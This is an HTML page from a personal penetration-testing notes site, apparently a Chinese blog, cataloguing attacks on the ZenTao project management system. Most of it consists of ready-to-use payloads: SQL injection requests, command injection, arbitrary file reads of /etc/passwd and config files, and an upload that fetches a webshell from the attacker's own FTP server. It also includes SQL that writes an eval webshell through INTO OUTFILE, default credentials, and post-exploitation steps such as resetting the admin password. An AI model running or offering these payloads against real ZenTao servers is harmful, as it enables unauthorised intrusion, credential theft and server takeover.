@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>禅道 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7985\u9053", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_2" },
+              {title: "\u63a2\u6d4b", url: "#_3" },
+              {title: "\u5386\u53f2\u6f0f\u6d1e", url: "#_5" },
+              {title: "\u540e\u6e17\u900f", url: "#_7" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9C/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9C/" class="btn btn-xs btn-link">
+        致远
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/" class="btn btn-xs btn-link">
+        用友
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">禅道</h1>
+<h2 id="_2">目录</h2>
+<ul>
+<li><a href="#探测">探测</a><ul>
+<li><a href="#fofa">fofa</a></li>
+<li><a href="#查看版本">查看版本</a><ul>
+<li><a href="#api看">api看</a></li>
+<li><a href="#F12看版本">F12看版本</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#历史漏洞">历史漏洞</a><ul>
+<li><a href="#开源版测试账号">开源版测试账号</a></li>
+<li><a href="#180beta1权限绕过命令注入rce">18.0.beta1权限绕过+命令注入rce</a></li>
+<li><a href="#禅道165-SQL注入漏洞">禅道16.5 SQL注入漏洞</a></li>
+<li><a href="#1242后台任意文件上传">12.4.2后台任意文件上传</a></li>
+<li><a href="#116后台存储xss">11.6后台存储xss</a></li>
+<li><a href="#116后台sql注入">11.6后台sql注入</a></li>
+<li><a href="#116-文件包含">11.6 文件包含</a></li>
+<li><a href="#116文件上传文件包含rce">11.6文件上传+文件包含→rce</a></li>
+<li><a href="#1242-任意文件读取下载">12.4.2 任意文件读取&amp;下载</a></li>
+<li><a href="#pro任意版本命令执行">pro任意版本命令执行</a></li>
+<li><a href="#82-921-低版本前台SQL注入写shell">8.2-9.2.1 低版本前台SQL注入写shell</a></li>
+</ul>
+</li>
+<li><a href="#后渗透">后渗透</a><ul>
+<li><a href="#获取组织架构">获取组织架构</a></li>
+<li><a href="#数据库中的账户密码位置">数据库中的账户密码位置</a></li>
+<li><a href="#装插件getshell">装插件getshell</a></li>
+</ul>
+</li>
+</ul>
+<p>禅道是一种开源的项目管理和协作系统。它提供了项目管理、任务管理、缺陷跟踪、文档管理、团队协作等功能，可以帮助团队高效地进行项目管理和协作。</p>
+<h2 id="_3">探测</h2>
+<h3 id="fofa">fofa</h3>
+<pre><code class="language-纯文本">https://fofa.info/result?qbase64=YXBwPSLmmJPova%2FlpKnliJst56aF6YGT57O757ufIg%3D%3D
+</code></pre>
+<h3 id="_4">查看版本</h3>
+<h4 id="api">api看</h4>
+<pre><code class="language-纯文本">http://127.0.0.1/zentao/index.php?mode=getconfig
+</code></pre>
+<h4 id="f12">F12看版本</h4>
+<p>F12搜索<strong>stylesheet</strong></p>
+<h2 id="_5">历史漏洞</h2>
+<h3 id="_6">开源版测试账号</h3>
+<p>密码均为123456</p>
+<pre><code class="language-纯文本">productManager
+projectManager
+dev1
+dev2
+dev3
+tester1
+tester2
+tester3
+testManager
+</code></pre>
+<p>当使用这些账号初次登录系统时，弹出的修改密码页面可能有bug，需要自行修改：点击<strong>右侧头像-修改密码</strong>，修改成功，即可进入系统</p>
+<h3 id="180beta1rce">18.0.beta1权限绕过+命令注入rce</h3>
+<pre><code class="language-纯文本">禅道系统  影响版本
+开源版  17.4以下的未知版本&lt;=version&lt;=18.0.beta1
+旗舰版  3.4以下的未知版本&lt;=version&lt;=4.0.beta1
+企业版  7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2
+</code></pre>
+<p><a href="https://github.com/0xf4n9x/Zentao-Captcha-RCE" title="https://github.com/0xf4n9x/Zentao-Captcha-RCE">https://github.com/0xf4n9x/Zentao-Captcha-RCE</a></p>
+<pre><code class="language-纯文本">1.exe -u url -c whoami
+</code></pre>
+<h3 id="165-sql">禅道16.5 SQL注入漏洞</h3>
+<p>报错注入</p>
+<pre><code class="language-纯文本">POST /user-login.html HTTP/1.1
+Host: 172.16.1.8
+Content-Length: 189
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Origin: http://172.16.1.8
+Referer: http://172.16.1.8/user-login-Lw==.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: 
+Connection: close
+
+account=aaa' and updatexml(1,concat(0x7e,(database()),0x7e),1) and '1'='1&amp;password=b1663c937c5c84c38568ef381912c740&amp;passwordStrength=0&amp;referer=%2F&amp;verifyRand=1090667403&amp;keepLogin=0&amp;captcha=
+</code></pre>
+<h3 id="1242">12.4.2后台任意文件上传</h3>
+<p>先通过ftp在自己vps传个马</p>
+<p><a href="ftp://192.168.5.104/a.php" title="ftp://192.168.5.104/a.php">ftp://192.168.5.104/a.php</a></p>
+<p>然后把这个链接base64加密，放入下面这个链接进行文件上传</p>
+<p><a href="http://127.0.0.1/zentao/client-download-1-(base64">http://127.0.0.1/zentao/client-download-1-(base64</a> encode webshelldownload link)-1.html</p>
+<p>然后访问即可</p>
+<p><a href="http://127.0.0.1/zentao/data/client/1/a.php">http://127.0.0.1/zentao/data/client/1/a.php</a></p>
+<h3 id="116xss">11.6后台存储xss</h3>
+<h3 id="116sql">11.6后台sql注入</h3>
+<pre><code class="language-纯文本">http://www.0-sec.org/zentaopms_11.6/www/api-getModel-user-getRealNameAndEmails-users=admin
+
+http://www.0-sec.org/zentaopms_11.6/www/api-getModel-api-sql-sql=select+account,password+from+zt
+_user
+
+</code></pre>
+<p><img alt="" src="../image/image_oILuiKBGIf.png" /></p>
+<h3 id="116">11.6 文件包含</h3>
+<pre><code class="language-纯文本">http://www.0-sec.org/zentaopms_11.6/www/api-getModel-file-parseCSV-fileName=/etc/passwd
+</code></pre>
+<h3 id="116rce">11.6文件上传+文件包含→rce</h3>
+<p>写文件</p>
+<pre><code class="language-纯文本">POST /api-getModel-editor-save-filePath=/tmp/shell.php
+
+fileContent=&lt;?php phpinfo();?&gt;
+</code></pre>
+<p>包含文件</p>
+<pre><code class="language-纯文本">http://127.0.0.1/api-getModel-api-getMethod-filePath=/tmp/shell/1
+</code></pre>
+<h3 id="1242_1">12.4.2 任意文件读取&amp;下载</h3>
+<pre><code class="language-纯文本">index.php?m=file&amp;f=sendDownHeader&amp;fileName=2&amp;fileType=1&amp;content=/etc/passwd&amp;type=file
+index.php?m=file&amp;f=sendDownHeader&amp;fileName=2&amp;fileType=1&amp;content=./../../config/my.php&amp;type=file
+
+</code></pre>
+<pre><code class="language-纯文本">index.php?m=im&amp;f=downloadXxdPackage&amp;xxdFileName=../../../../../../../../../etc/passwd
+</code></pre>
+<h3 id="pro">pro任意版本命令执行</h3>
+<p>client参数进行命令执行</p>
+<pre><code class="language-纯文本">POST /repo-create.html
+
+SCM=Git&amp;name=test2&amp;path=C%3A%5CProgramData&amp;encoding=utf-8&amp;client=whoami
+</code></pre>
+<h3 id="82-921-sqlshell"><strong>8.2-9.2.1</strong> 低版本前台SQL注入写shell</h3>
+<p>随便输路由会爆绝对路径</p>
+<p><img alt="" src="../image/image_xC0JQIXEZc.png" /></p>
+<p>如果没报错，就用这个payload</p>
+<pre><code class="language-纯文本">{&quot;orderBy&quot;:&quot;order limit 1,1 PROCEDURE ANALYSE(polygon(id),1)#&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}
+base64转化
+eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxIFBST0NFRFVSRSBBTkFMWVNFKHBvbHlnb24oaWQpLDEpIyIsIm51bSI6IjEsMSIsInR5cGUiOiJvcGVuZWRieW1lIn0=
+
+</code></pre>
+<pre><code class="language-纯文本">base64字符放入param参数
+http://127.0.0.1:81/zentao/index.php?m=block&amp;f=main&amp;mode=getblockdata&amp;blockid=case&amp;param=base64
+
+</code></pre>
+<p>into outfile 写shell</p>
+<pre><code class="language-纯文本">select '&lt;?php phpinfo();?&gt;' into outfile 'C:/Users/Administrator/Desktop/xampp/zentao/www/test.php'
+
+73656c65637420273c3f70687020706870696e666f28293b3f3e2720696e746f206f757466696c652027433a2f55736572732f41646d696e6973747261746f722f4465736b746f702f78616d70702f7a656e74616f2f7777772f746573742e70687027
+</code></pre>
+<p>上面这个方法如果不能写，可以用如下方式尝试bypass</p>
+<pre><code class="language-纯文本">select '&lt;?php @eval($_POST[x])?&gt;' into outfile 'D:/zentao/xampp/zentao/www/hack.php'
+
+hex编码（注意加密解密都不带0x，但是EXP中需要加上）
+73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027
+
+payload原型
+{&quot;orderBy&quot;:&quot;order limit 1;SET @SQL=0x73656C65637420273C3F70687020406576616C28245F504F53545B785D293F3E2720696E746F206F757466696C652027443A2F7A656E74616F2F78616D70702F7A656E74616F2F7777772F6861636B2E70687027;PREPARE pord FROM @SQL;EXECUTE pord;-- -&quot;,&quot;num&quot;:&quot;1,1&quot;,&quot;type&quot;:&quot;openedbyme&quot;}
+
+base64加密
+eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtTRVQgQFNRTD0weDczNjU2QzY1NjM3NDIwMjczQzNGNzA2ODcwMjA0MDY1NzY2MTZDMjgyNDVGNTA0RjUzNTQ1Qjc4NUQyOTNGM0UyNzIwNjk2RTc0NkYyMDZGNzU3NDY2Njk2QzY1MjAyNzQ0M0EyRjdBNjU2RTc0NjE2RjJGNzg2MTZENzA3MDJGN0E2NTZFNzQ2MTZGMkY3Nzc3NzcyRjY4NjE2MzZCMkU3MDY4NzAyNztQUkVQQVJFIHBvcmQgRlJPTSBAU1FMO0VYRUNVVEUgcG9yZDstLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==
+
+
+</code></pre>
+<h2 id="_7">后渗透</h2>
+<h3 id="_8">获取组织架构</h3>
+<pre><code class="language-纯文本">ip/my-team.html
+</code></pre>
+<h3 id="_9">数据库中的账户密码位置</h3>
+<p><strong>zentao</strong>库，<strong>zt_user</strong>表</p>
+<p>password字段（被md5加密）和account字段</p>
+<p>改管理员密码进行登录，password需md5加密</p>
+<pre><code class="language-纯文本">update zt_user SET password='10685fcd8e87988b0b02ac12d3f0ae88' where id=1;
+</code></pre>
+<h3 id="getshell">装插件getshell</h3>
+<p>后台→插件，admin才能装，但是可能点击插件后，提示必须在机器上创建一个特定文件才能装插件（验证admin身份），这种情况就没办法了</p>
+<p>有可能有可以执行命令的插件。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9C/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E8%87%B4%E8%BF%9C/%E8%87%B4%E8%BF%9C/" class="btn btn-xs btn-link">
+        致远
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8B/" class="btn btn-xs btn-link">
+        用友
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
